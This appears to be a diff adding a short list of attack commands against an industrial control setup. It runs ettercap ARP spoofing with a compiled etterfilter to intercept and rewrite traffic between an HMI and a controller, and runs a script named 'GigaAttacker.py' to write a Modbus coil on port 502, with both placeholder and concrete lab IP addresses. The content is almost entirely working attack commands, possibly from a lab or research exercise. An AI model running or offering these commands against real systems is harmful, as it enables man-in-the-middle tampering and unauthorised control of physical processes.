@@ -1,0 +1,18 @@
+sudo etterfilter -o bitrate_response.ef bitrate_response.filter
+sudo ettercap -T -i YOUR_NIC -F bitrate_response.ef -q -M arp /HMI_IP// /BS_IP// -V hex
+
+
+
+
+
+
+
+
+
+
+
+python3 GigaAttacker.py -write-coil -addr 1 -val 0 -ip BS_IP -p 502
+
+python gigaattacker.py -write-coil -addr 1 -val 0 -ip 192.168.133.41 -p 502
+
+sudo ettercap -T -i wlp2s0 -F bitrate_response.ef -q -M arp /192.168.133.193// /192.168.133.41// -V hex
